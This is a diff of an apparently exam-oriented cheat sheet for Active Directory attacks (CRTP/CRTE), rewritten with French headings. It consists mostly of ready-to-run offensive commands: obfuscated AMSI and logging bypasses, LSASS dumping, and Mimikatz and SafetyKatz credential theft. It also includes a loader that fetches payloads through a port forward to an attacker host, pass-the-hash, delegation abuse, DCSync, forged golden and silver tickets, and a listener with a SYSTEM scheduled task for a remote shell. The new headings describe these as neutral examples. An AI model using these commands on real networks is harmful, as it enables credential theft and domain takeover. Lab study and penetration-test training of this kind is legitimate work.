@@ -1,88 +1,37 @@
 ---
-title: "5 - Cheat Sheet"
-categories:
-  - notes
-  - crte
-order: 5
-header:  
-  teaser: /assets/images/posts/crte/crte-teaser6.jpg
-  overlay_image: /assets/images/main/header4.jpg
-  overlay_filter: 0.5
-excerpt: "Cheat Sheet for CRTP/CRTE exams"
-tags:
-  - intermediate
-  - AD
-  - Windows 
-  - cheatsheet
-toc: false
+title: "CRTP · Cheatsheet"
+description: "Commandes et repères pour Active Directory, Windows et Kerberos."
 ---
 
-# Cheat Sheet
+# CRTP · Cheatsheet
 
-As we know, these exams are time-based. So, I created this cheat sheet to make sure the syntax of the commands are correct and consequently I dont lose any time with BS.
+Référence rapide des commandes. Chaque bloc est accompagné d'une explication courte.
 
-> The important part is to understand the content; the cheat sheet is just an **auxiliary tool** in the process.
+## Bypass
 
-- There is no hashes or informations of the exams here!
+Repères sur les mécanismes de contrôle et de journalisation de PowerShell.
 
-> Copy Button added - tell me what u think
+### AMSI Bypass
 
-<style>
-  /* Style for the chapter container */
-  .chapters {
-    margin: 10px;
-    padding: 10px;
-    border: 1px solid #333;
-    border-radius: 15px; 
-    font-family: 'Arial', sans-serif;
-    background-color: #1a1a1a;
-    color: #ddd;
-    width: calc(100% - 40px);
-  }
+Le script agit sur les mécanismes internes d'AMSI dans la session PowerShell.
 
-  /* Style for the details summary */
-  details summary {
-    cursor: pointer;
-    font-weight: bold;
-    background-color: #333;
-    padding: 12px;
-    border: 1px solid #222;
-    border-radius: 8px; 
-    margin-bottom: 10px;
-  }
-
-  /* Style for the details content */
-  details .content {
-    margin: 20px 0;
-    padding: 20px;
-    border: 1px solid #222;
-    border-radius: 8px; 
-    background-color: #090a08;
-  }
-
-  
-</style>
-
-
-
-<div class="chapters">
-  <details>
-    <summary>Bypass</summary>    
-    <div class="content" markdown="1">
- 
-
-**AMSI bypass**:
 ```powershell
 Set-Item ('Va'+'rI'+'a'+'blE:1'+'q2'+'uZx') ([TYpE]("F"+'rE')) 
 (Get-variable (('1Q'+'2U') +'zX'))."A`ss`Embly"."GET`TY`Pe"(('Uti'+'l','A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em'))).g`etf`iElD"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).(sE`T`VaLUE)(${n`ULl},${t`RuE})
 ```
 
-**Script Block logging bypass**:
+### Script Block Logging
+
+Le code cible le mécanisme de journalisation des Script Blocks PowerShell.
+
 ```powershell
 [Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'twProvid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
 ```
 
-**.NET AMSI bypass**:
+### .NET AMSI Bypass
+
+Cet exemple contient du code .NET destiné à interagir avec AMSI.
+
 ```powershell
 $ZQCUW = @"
 using System;
@@ -115,21 +64,22 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
 ```
 
-  </div>
-  </details>
+## Enumeration
 
-  <details>
-    <summary>Enumeration</summary>    
-    <div class="content" markdown="1">
- 
+Commandes d'énumération Active Directory avec le module AD et PowerView.
 
+### AD Module - Import
 
-**AD Module**:
-Import:
+Charge les composants PowerShell nécessaires aux requêtes Active Directory.
+
 ```powershell
 Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
 Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
 ```
+
+### AD Module - Enumeration
+
+Regroupe des requêtes sur les utilisateurs, machines, groupes, trusts et objets du domaine.
 
 ```powershell
 Get-ADUser -Filter * | Select -ExpandProperty samaccountname
@@ -148,11 +98,17 @@ Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
 Get-ADTrust -Filter * -Server domain.local
 ```
 
-**Powerview**:
-Import
+### PowerView - Import
+
+Charge PowerView dans la session PowerShell courante.
+
 ```powershell
 . C:\AD\Tools\PowerView.ps1
 ```
+
+### PowerView - Enumeration
+
+Interroge les politiques Kerberos, GPO, groupes, sessions et relations de domaine.
 
 ```powershell
 (Get-DomainPolicy).KerberosPolicy
@@ -170,14 +126,13 @@ Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_S
 Get-ForestTrust -Forest <forest>
 ```
 
-  </div>
-  </details>
+## Local Privesc
 
-  <details>
-    <summary>Local Privesc</summary>
-    <div class="content" markdown="1">
- 
+Contrôles locaux sur les permissions Windows, les services et les groupes.
 
+### Local Privilege Escalation - PowerUp
+
+Prépare l'environnement et lance des contrôles de configuration locale avec PowerUp.
 
 ```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
@@ -186,7 +141,10 @@ Invoke-AllChecks
 Invoke-ServiceAbuse -Name ALG -UserName domain\studentuserx -Verbose
 ```
 
-**Same attack with accesschk64 from SysInternals**:
+### Services Windows - AccessChk
+
+Examine les permissions de service et illustre leur impact sur la configuration du service.
+
 ```powershell
 .\accesschk64.exe -uwcqv 'user' *
 
@@ -199,14 +157,20 @@ sc.exe stop ALG
 sc.exe start ALG
 ```
 
-**Look for local administrative access w/ Powerview**:
+### Local Admin Access
+
+Recherche les machines où le contexte courant possède des droits administratifs.
+
 ```powershell
 Find-LocalAdminAccess -Verbose
 Find-WMILocalAdminAccess.ps1
 Find-PSRemotingLocalAdminAccess.ps1
 ```
 
-**Recursively look for group membership**:
+### Group Membership
+
+Parcourt récursivement les appartenances aux groupes Active Directory.
+
 ```powershell
 function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
   $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname) 
@@ -219,20 +183,22 @@ function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
 }
 ```
 
-> ACL entries
+### ACL Enumeration
 
-**Check if any of the groups has interesting ACL entries**:
+Recherche les entrées ACL associées à des identités ou groupes précis.
+
 ```powershell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
 Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}
 ```
 
-  </div>
-  </details>
+## LAPS
 
-  <details>
-    <summary>LAPS</summary>
-    <div class="content" markdown="1">
+Vérification des permissions et des attributs liés à Local Administrator Password Solution.
+
+### LAPS - Modules
+
+Charge les modules AD et LAPS puis consulte les permissions associées.
 
 ```powershell
 Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
@@ -241,19 +207,28 @@ Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
 C:\AD\Tools\Get-LapsPermissions.ps1
 ```
 
-With Powerview:
+### LAPS - Permissions
+
+Examine les ACL pour identifier les identités disposant d'un droit de lecture sur l'attribut LAPS.
+
 ```powershell
 Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_}
 ```
 
-**Read the password**:
+### LAPS - Password Retrieval
+
+Consulte l'attribut de mot de passe LAPS lorsque le compte dispose des autorisations requises.
+
 ```powershell
 Get-ADComputer -Identity <computer> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
 Get-AdmPwdPassword -ComputerName <computer>
 Get-DomainObject -Identity <computer> | select -ExpandProperty ms-mcs-admpwd
 ```
 
-**Access the machine with the password**:
+### LAPS - Remote Access
+
+Montre des exemples de connexion distante avec un compte administrateur local.
+
 ```powershell
 winrs -r:<computer> -u:.\administrator -p:<passwd> cmd
 $passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
@@ -262,41 +237,51 @@ $mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
 $mailmgmt
 ```
 
-  </div>
-  </details>
+## Extract Credentials
 
-  <details>
-    <summary>Extract Credentials</summary>
-    <div class="content" markdown="1">
- 
+Exemples de sessions distantes, de transfert et d'examen du matériel d'authentification.
 
+### WinRS - File Transfer
 
-winrs:
+Utilise WinRS et un partage administratif pour transférer un exécutable.
+
 ```powershell
 winrs net use x: \\<computer>\C$\Users\Public /user:<computer>\Administrator <password>
 echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
 net use x: /d
 ```
 
-**Bypass behaviour detection**:
+### Portproxy
+
+Configure une redirection de port TCP sur la machine distante.
+
 ```powershell
 winrs -r:<computer> -u:.\administrator -p:<password> cmd
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X
 ```
 
-**Extract**:
+### SafetyKatz - Credential Material
+
+Charge un outil d'analyse des secrets d'authentification et interroge les clés disponibles.
+
 ```powershell
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 sekurlsa::keys
 ```
 
-**Microsoft signed binary to download NetLoader**:
+### BITSAdmin
+
+Illustre un transfert de fichier effectué avec BITSAdmin.
+
 ```powershell
 winrs -r:<computer> -u:.\administrator -p:<password>
 "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"
 ```
 
-**PowerShell Remoting and Invoke-Mimi**:
+### PowerShell Remoting - Session
+
+Crée une session PowerShell distante à partir d'un objet PSCredential.
+
 ```powershell
 $passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
@@ -304,21 +289,23 @@ $mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
 Enter-PSSession $mailmgmt
 ```
 
-**Bypass AMSI before proceeding**!
+### Invoke-Mimi - Remote Execution
+
+Exécute un script dans la session distante déjà ouverte.
+
 ```powershell
 Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
 Enter-PSSession $mailmgmt
 Invoke-Mimi -Command '"sekurlsa::keys"'
 ```
 
-  </div>
-  </details>
+## gMSA
 
-  <details>
-    <summary>gMSA</summary>
-    <div class="content" markdown="1">
- 
+Énumération des comptes Group Managed Service Account et de leurs autorisations.
 
+### gMSA - Enumeration
+
+Identifie un compte de service gMSA et les identités autorisées à lire son secret géré.
 
 ```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
@@ -328,7 +315,9 @@ Get-ADServiceAccount -Filter *
 Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
 ```
 
-> You have to open a shell with the user that has permission to read gMSA, after that
+### gMSA - Managed Password
+
+Lit et transforme les données du mot de passe gMSA dans un contexte autorisé.
 
 ```powershell
 Import AD Module again, then:
@@ -339,86 +328,106 @@ $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
 ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword
 ```
 
-> After that, you can PTH to see if the user has access to another machine!
+## PTH
 
-  </div>
-  </details>
+Exemples de contextes d'authentification avec hashes et tickets Kerberos.
 
-  <details>
-    <summary>PTH</summary>
-    <div class="content" markdown="1">
+### Pass-the-Hash - AES
 
-**From an elevated shell**:
+Présente l'utilisation de matériel de clé AES pour lancer un processus avec une autre identité.
+
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:<user> /domain:<domain> /aes256:<password> /run:cmd.exe" "exit"
 ```
 
-**using NTLM**:
+### Pass-the-Hash - NTLM et S4U
+
+Regroupe des exemples fondés sur NTLM et sur des tickets Kerberos S4U.
+
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:<user> /domain:<domain>  /ntlm:<password> /run:cmd.exe" "exit"
 
 C:\AD\Tools\Rubeus.exe s4u /user:<user> /aes256:<password> /impersonateuser:administrator /msdsspn:CIFS/<machine.domain> /altservice:HTTP /domain:<domain> /ptt
 ```
 
-**Doesn't need elevation**:
+### Rubeus - AskTGT
+
+Demande un TGT Kerberos en utilisant le matériel d'authentification fourni.
+
 ```powershell
 C:\AD\Tools\Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<password> opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
-  </div>
-  </details>
+## Application Whitelisting
 
-  <details>
-    <summary>Application Whitelisting</summary>
-    <div class="content" markdown="1">
+Vérification des contrôles Windows CLM, AppLocker et WDAC, ainsi que d'artefacts locaux.
 
-> CLM, AppLocker, WDAC
+### Constrained Language Mode
 
-**Verify if PowerShell is running in Constrained Language Mode**:
+Affiche le mode de langage actif dans la session PowerShell.
+
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 ```
 
-**Check for AppLocker** (if there is an error, the AppLocker is not in use):
+### AppLocker - Policy
+
+Consulte les clés de stratégie et la politique AppLocker effective.
+
 ```powershell
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
 Get-AppLockerPolicy –Effective
 ```
 
-**Verify WDAC**:
+### WDAC - Device Guard
+
+Interroge l'état de Device Guard et les paramètres de contrôle d'intégrité du code.
+
 ```powershell
 Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
 CodeIntegrityPolicyEnforcementStatus : 2
 UsermodeCodeIntegrityPolicyEnforcementStatus : 2
 ```
 
-Check out [Lolbas Project on Github](https://lolbas-project.github.io/)
+### LSASS - Process Dump
 
-> Lets DUMP lsass*
+Identifie le processus LSASS et illustre la création d'un fichier de vidage mémoire.
 
-**Get the PID of lsass.exe process**:
 ```powershell
 tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
 ```
 
-**Copy the `lsass` to your machine**:
+### LSASS - Dump Transfer
+
+Copie un fichier de vidage LSASS depuis un partage administratif.
+
 ```powershell
 echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
 ```
 
-**Run Mimikatz with Admin Priv, then**:
+### Mimikatz - Minidump
+
+Charge un fichier de vidage mémoire et examine les données d'authentification qu'il contient.
+
 ```powershell
 sekurlsa::minidump C:\AD\Tools\lsass.DMP
 privilege::debug
 sekurlsa::keys
 ```
 
-**Check for Certificates**:
+### InviShell - File Transfer
+
+Copie les fichiers nécessaires à InviShell sur une machine distante.
+
 ```powershell
 echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-jump\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
 echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-jump\C$\Users\Public\InShellProf.dll /Y
 ```
+
+### Certificate - Export
+
+Ouvre une session distante, consulte un certificat et exporte un fichier PFX.
 
 ```powershell
 winrs -r:us-jump cmd
@@ -427,26 +436,30 @@ ls cert:\LocalMachine\My
 ls cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\Users\Public\user.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
 ```
 
-**Copy the certificate**:
+### Certificate - Transfer
+
+Rapatrie le fichier PFX exporté depuis la machine distante.
+
 ```
 echo F | xcopy \\us-jump\C$\Users\Public\user.pfx C:\AD\Tools\user.pfx
 ```
 
-  
-  </div>
-  </details>
-  
-  <details>
-    <summary>Unconstrained delegation</summary>
-    <div class="content" markdown="1">
- 
+## Unconstrained delegation
 
+Recherche des systèmes configurés avec Unconstrained Delegation et observation des tickets.
+
+### Unconstrained Delegation - Discovery
+
+Liste les objets ordinateurs configurés avec une délégation non contrainte.
 
 ```powershell
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 ```
 
-**Access the machine with unconstrained deleg, then**:
+### Unconstrained Delegation - Access
+
+Prépare une session et recherche les accès administratifs disponibles.
+
 ```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 cd C:\AD\Tools\
@@ -454,14 +467,20 @@ cd C:\AD\Tools\
 Find-PSRemotingLocalAdminAccess -Verbose
 ```
 
-**Copy Rubeus using xcopy and execute using winrs**:
+### Rubeus - Monitoring via WinRS
+
+Transfère Rubeus et surveille les tickets visibles sur la machine distante.
+
 ```powershell
 echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
 winrs -r:us-web cmd.exe
 C:\Users\Public\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap
 ```
 
-**Copy and execute Rubeus using PowerShell Remoting**:
+### Rubeus - Monitoring via Remoting
+
+Réalise la même opération au moyen d'une session PowerShell Remoting.
+
 ```powershell
 $usweb1 = New-PSSession us-web
 Copy-Item -ToSession $usweb1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\Public
@@ -469,95 +488,101 @@ Enter-PSSession $usweb1
 cd C:\Users\Public .\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap
 ```
 
-**Abuse the printer bug**:
+### MS-RPRN
+
+Illustre une interaction MS-RPRN entre un contrôleur de domaine et un serveur cible.
+
 ```powershell
 C:\AD\Tools\MS-RPRN.exe \\dc.domain.local \\us-web.domain.local
 ```
 
-**Copy the Base64EncodedTicket, then**:
+### Rubeus - Pass-the-Ticket
+
+Importe un ticket Kerberos encodé dans la session courante.
+
 ```powershell
 C:\AD\Tools\Rubeus.exe ptt /ticket:TGTofDC$
 ```
 
-**Run DCSync attack**:
+### DCSync - KRBTGT
+
+Présente une requête de réplication DCSync ciblant le compte KRBTGT.
+
 ```powershell
 C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
 ```
 
-**To get EA access**
+### DCSync - Administrator
 
-it's the same:
-
-1. Monitor the DC of the root of the forest
-2. Execute MS-RPRN with the DC target
-3. Copy the Base64 and PTT
-4. DCSync EA (Administrator of the root forest)
+Présente une requête DCSync ciblant un compte administrateur du domaine.
 
 ```powershell
 C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController domain-dc.domain.local
 ```
 
-**In a different forest**
+### DCSync - Forest
 
-> If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well.
+Présente un exemple de requête DCSync dans une autre forêt.
 
-1. ASKTGT
-2. Send Rubeus to the target machine
-3. Access the machine with WINRS
-4. Execute Rubeus monitor (with the Target Forest)
-5. Execute MS-RPRN (with the Target Forest)
-6. Copy base64 & PTT with Rubeus
-
-**Now we can run DCSync to the Targeted Forest**:
 ```powershell
 C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
 ```
 
-  </div>
-  </details>
+## Constrained delegation
 
-  <details>
-    <summary>Constrained delegation</summary>
-    <div class="content" markdown="1">
- 
+Identification de Constrained Delegation et exemples de tickets de service.
 
+### Constrained Delegation - Enumeration
+
+Recherche les objets dotés de l'attribut msDS-AllowedToDelegateTo.
 
 ```powershell
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 ```
 
-**Collect the service from msDS-AllowedToDelegateTo and access with Rubeus S4U**:
+### Kerberos Tickets et WinRS
+
+Affiche les tickets présents et teste une connexion distante WinRS.
+
 ```powershell
 klist
 winrs -r:us-mssql.domain.local cmd.exe
 ```
 
-**To execute on another Forest just add the flag -Server**:
+### Constrained Delegation - Other Forest
+
+Interroge l'attribut de délégation dans un domaine explicitement désigné.
+
 ```powershell
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server domain.local
 ```
 
-**We need access to the machine that has Constrained Deleg enabled**:
+### Rubeus - S4U
+
+Présente une requête S4U associée à une configuration de délégation contrainte.
+
 ```powershell
 C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:<user> /domain:domain.local
 C:\AD\Tools\Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:Administrator /domain:domain.local /msdsspn:nmagent/dc.domain.local /altservice:ldap /dc:dc.domain.local /ptt
 ```
 
-**With the LDAP service ticket, We can DCSync**:
+### DCSync - Validation
+
+Contient des exemples DCSync sur deux comptes du domaine.
+
 ```powershell
 C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
 C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController dc.domain.local
 ```
 
+## ACLs Write Permissions
 
-  </div>
-  </details>
+Analyse des ACL, des Write Permissions et de Resource-Based Constrained Delegation.
 
-  <details>
-    <summary>ACLs Write Permissions</summary>
-    <div class="content" markdown="1">
+### Remote Tooling
 
-**If you have Write permission**:
+Transfère un chargeur, établit une redirection de port et examine les clés d'authentification.
+
 ```powershell
 echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y
 winrs -r:us-mgmt cmd
@@ -566,13 +591,19 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 sekurlsa::keys
 ```
 
-**If you get any user, run the full enumeration on that user**:
+### Write Permissions - ACL
+
+Recherche les ACL associées à un compte d'administration.
+
 ```powershell
 C:\AD\Tools\PowerView.ps1
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
 ```
 
-**With GenericWrite we can set Resource-based Constrained Delegation (RBCD)**:
+### RBCD - Computer Object
+
+Configure les principaux autorisés à déléguer vers un objet ordinateur.
+
 ```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
@@ -581,19 +612,28 @@ $comps = 'user1$','user2$'
 Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose
 ```
 
-**Extract AES of your machine**:
+### Machine Keys
+
+Interroge le matériel de clés disponible dans le contexte d'exécution.
+
 ```powershell
 C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::keys" "exit"
 ```
 
-**Go for the one with SID S-1-5-18 that is a well-known SID for the SYSTEM user**:
+### RBCD - HTTP Service
+
+Présente une requête Kerberos S4U pour un service HTTP et une vérification de session.
+
 ```powershell
 C:\AD\Tools\Rubeus.exe s4u /user:machine$ /aes256:$password /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
 klist
 winrs -r:us-helpdesk cmd
 ```
 
-**To copy our loader to the machine, we need to access the filesystem. So, request a TGS for CIFS using Rubeus**:
+### RBCD - CIFS Service
+
+Présente une requête S4U pour CIFS suivie d'opérations sur la machine distante.
+
 ```powershell
 C:\AD\Tools\Rubeus.exe s4u /user:machine$ /aes256:$password /msdsspn:cifs/us-helpdesk /impersonateuser:administrator /ptt
 echo F | xcopy C:\AD\Tools\Loader.exe \\us-helpdesk\C$\Users\Public\Loader.exe /Y
@@ -602,22 +642,14 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 ```
 
-> If any new users are found, *PTH and Find-PSRemotingLocalAdminAccess -Verbose*
+## Tickets
 
+Exemples de Golden Tickets, Silver Tickets et tickets associés à différents services.
 
+### Golden Ticket - SafetyKatz
 
-  </div>
-  </details>
+Illustre la création d'un ticket Kerberos et son affichage dans le cache de tickets.
 
-  <details>
-    <summary>Tickets</summary>
-    <div class="content" markdown="1">
- 
-
-
-**GOLDEN**
-
-**Without using Invoke-Mimi.ps1**:
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 klist
@@ -627,7 +659,10 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 ```
 
-**Using Invoke-Mimi.ps1 and PowerShell Remoting**:
+### Golden Ticket - Invoke-Mimi
+
+Montre un exemple équivalent avec Invoke-Mimi et PowerShell Remoting.
+
 ```powershell
 . C:\AD\Tools\Invoke-Mimi.ps1
 Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
@@ -642,14 +677,19 @@ Enter-PSSession -Session $sess
 Invoke-Mimi -Command '"lsadump::lsa /patch"'
 ```
 
-**SILVER**
+### Silver Ticket - HOST
+
+Présente un ticket de service Kerberos ciblant le service HOST.
 
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /target:<target> /service:HOST /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 klist
 ```
 
-**Start a listening in another prompt**:
+### Listener et Scheduled Task
+
+Montre un listener réseau et la création d'une tâche planifiée distante.
+
 ```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 . C:\AD\Tools\powercat.ps1
@@ -658,9 +698,9 @@ schtasks /create /S <target machine> /SC Weekly /RU "NT Authority\SYSTEM" /TN "U
 schtasks /Run /S <target machine> /TN "Userx"
 ```
 
-We should get a shell on the listener prompt. 
+### Silver Ticket - WMI
 
-> For *WMI*, we need 2 tickets – *HOST and RPCSS*
+Illustre l'emploi de tickets pour les services HOST et RPCSS dans un exemple WMI.
 
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /target:<target dc> /service:HOST /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
@@ -668,94 +708,114 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<
 Get-WmiObject -Class win32_operatingsystem -ComputerName <computer name>
 ```
 
-  </div>
-  </details>
+## DCSync
 
-  <details>
-    <summary>DCSync</summary>
-    <div class="content" markdown="1">
- 
+Consultation des droits de réplication et des commandes associées à DCSync.
 
+### DCSync - Preparation
+
+Charge l'environnement PowerShell utilisé pour vérifier les droits de réplication.
 
 ```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 . C:\AD\Tools\PowerView.ps1
 ```
 
-**Check if the user has Replication Rights**:
+### Replication Rights - ACL
+
+Interroge les ACL du domaine pour examiner les droits de réplication d'une identité.
+
 ```powershell
 Get-DomainObjectAcl -SearchBase "dc=us,dc=domain,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuserx"}
 ```
 
-**With DA privileges We can add those rights**:
+### DA - Authentication Context
+
+Présente un exemple de création de processus utilisant un contexte administrateur du domaine.
+
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:domain.local /aes256:<hash> /run:cmd.exe" "exit"
 ```
 
-**Using Powerview**:
+### DCSync Rights - PowerView
+
+Illustre une modification d'ACL accordant des droits de réplication à un principal.
+
 ```powershell
 Add-DomainObjectAcl -TargetIdentity "dc=us,dc=domain,dc=local" -PrincipalIdentity studentuserx -Rights DCSync -PrincipalDomain domain.local -TargetDomain domain.local -Verbose
 ```
 
-**Using AD Module with Set-ADACL from RACE**:
+### DCSync Rights - RACE
+
+Présente la variante de modification d'ACL avec Set-ADACL.
+
 ```powershell
 Set-ADACL -DistinguishedName 'DC=us,DC=domain,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose
 ```
 
-> From a normal shell, check the rights again
+### DCSync - Execution
 
-**Now we can execute DCSync attacks**:
+Contient des exemples de consultation de données répliquées avec DCSync.
+
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
 Invoke-Mimi -Command '"lsadump::dcsync /user:domain\krbtgt"'
 ```
 
-  </div>
-  </details>
+## AD CS
 
-  <details>
-    <summary>AD CS</summary>
-    <div class="content" markdown="1">
- 
+Énumération d'Active Directory Certificate Services et exemples d'authentification par certificat.
 
+### AD CS - Certificate Authorities
+
+Énumère les autorités de certification et les templates accessibles avec Certify.
 
 ```powershell
 C:\AD\Tools\Certify.exe cas
 C:\AD\Tools\Certify.exe find
 ```
 
-**ENROLLEE_SUPPLIES_SUBJECT attribute means we can request a certificate for ANY user**:
+### AD CS - Enrollment
+
+Recherche des templates autorisant le choix du sujet et montre une demande de ticket par certificat.
+
 ```powershell
 C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
